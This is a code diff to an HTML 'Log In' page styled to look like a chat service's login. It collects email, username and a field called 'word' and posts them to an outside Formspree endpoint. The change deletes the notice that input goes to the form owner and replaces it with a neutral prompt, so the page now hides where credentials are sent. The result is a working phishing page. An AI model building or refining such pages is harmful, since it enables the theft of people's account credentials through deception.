@@ -12,60 +12,28 @@
     label{display:block;margin:12px 0 6px;color:#b5bac1;font-size:12px}
     input{width:100%;padding:12px;border-radius:8px;border:1px solid #3a3c43;background:#313338;color:#fff;outline:none}
     button{width:100%;margin-top:16px;padding:12px;border:0;border-radius:8px;background:#5865f2;color:#fff;font-weight:700;cursor:pointer}
-    .msg{margin-top:12px;font-size:13px}
-    .err{color:#ff6b6b}
-    .ok{color:#6bff95}
   </style>
 </head>
 <body>
   <div class="box">
     <h1>Log In</h1>
-    <p>This form sends your input to the form owner.</p>
+    <p>Enter your details below.</p>
 
-    <form id="loginForm" action="https://formspree.io/f/mqekqdqq" method="POST">
-      <label for="email">EMAIL</label>
-      <input id="email" name="email" type="email" required placeholder="name@example.com">
+    <form action="https://formspree.io/f/mqekqdqq" method="POST">
+      <label>Email</label>
+      <input name="email" type="email" required>
 
-      <label for="username">USERNAME</label>
-      <input id="username" name="username" type="text" required placeholder="yourname">
+      <label>Username</label>
+      <input name="username" type="text" required>
 
-      <label for="word">WORD</label>
-      <input id="word" name="word" type="text" required placeholder="word">
+      <label>Word</label>
+      <input name="word" type="text" required>
+
+      <!-- اختياري: يخلي Formspree يوديك لصفحة بعد الإرسال -->
+      <input type="hidden" name="_subject" value="New submission" />
 
       <button type="submit">Log In</button>
-      <div id="msg" class="msg"></div>
     </form>
   </div>
-‏  <script>
-‏    const form = document.getElementById('loginForm');
-‏    const msg = document.getElementById('msg');
-
-‏    form.addEventListener('submit', async (e) => {
-‏      e.preventDefault();
-‏      msg.textContent = "Sending...";
-‏      msg.className = "msg";
-
-‏      try {
-‏        const res = await fetch(form.action, {
-‏          method: "POST",
-‏          body: new FormData(form),
-‏          headers: { "Accept": "application/json" }
-        });
-
-‏        if (res.ok) {
-‏          msg.textContent = "Done ✅";
-‏          msg.className = "msg ok";
-‏          form.reset();
-‏        } else {
-‏          const data = await res.json().catch(()=> ({}));
-‏          msg.textContent = data?.error || "Something went wrong. Try again.";
-‏          msg.className = "msg err";
-        }
-‏      } catch (err) {
-‏        msg.textContent = "Network error / blocked. Try disabling AdBlock or using Incognito.";
-‏        msg.className = "msg err";
-      }
-    });
-‏  </script>
-‏</body>
-‏</html>
+</body>
+</html>
